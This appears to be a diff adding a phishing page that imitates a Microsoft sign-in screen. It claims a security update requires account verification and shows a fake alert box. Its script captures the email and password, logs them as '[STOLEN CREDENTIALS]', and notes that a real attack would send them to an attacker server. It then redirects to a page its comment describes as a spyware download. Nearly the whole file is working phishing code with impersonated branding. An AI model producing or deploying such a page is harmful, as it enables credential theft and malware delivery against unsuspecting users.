@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background: white;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            width: 440px;
+            text-align: center;
+        }
+
+        .microsoft-logo {
+            font-size: 24px;
+            font-weight: 600;
+            color: #5E5E5E;
+            margin-bottom: 32px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1B1B1B;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #605E5C;
+            margin-bottom: 24px;
+        }
+
+        .alert-box {
+            background: #FFF4CE;
+            border: 1px solid #D83B01;
+            padding: 12px;
+            margin-bottom: 24px;
+            text-align: left;
+            border-radius: 2px;
+        }
+
+        .alert-box strong {
+            color: #D83B01;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            color: #1B1B1B;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 11px;
+            font-size: 15px;
+            border: 1px solid #8A8886;
+            border-radius: 2px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border: 2px solid #0078D4;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 11px;
+            background: #0078D4;
+            color: white;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 2px;
+            margin-top: 24px;
+        }
+
+        .login-button:hover {
+            background: #106EBE;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 16px;
+            color: #0078D4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #605E5C;
+        }
+
+        .footer a {
+            color: #605E5C;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 16px;
+            color: #0078D4;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="microsoft-logo">Microsoft</div>
+        
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Microsoft Security Update</div>
+        
+        <div class="alert-box">
+            <strong>⚠️ Security Alert:</strong> Your account requires verification to download critical security updates.
+        </div>
+
+        <form id="loginForm" onsubmit="return handleLogin(event)">
+            <div class="input-group">
+                <label for="email">Email or phone</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <button type="submit" class="login-button">Sign in</button>
+            
+            <div class="loading" id="loading">Verifying credentials...</div>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </form>
+
+        <div class="footer">
+            <a href="#">Terms of use</a> | 
+            <a href="#">Privacy & cookies</a>
+            <br><br>
+            © 2025 Microsoft
+        </div>
+    </div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.login-button').disabled = true;
+            
+            // Send credentials to attacker (in real attack, would send to attacker server)
+            console.log('[STOLEN CREDENTIALS]');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            
+            // After 2 seconds, redirect to download spyware
+            setTimeout(function() {
+                // Redirect to download page
+                window.location.href = 'windows-update.html';
+            }, 2000);
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
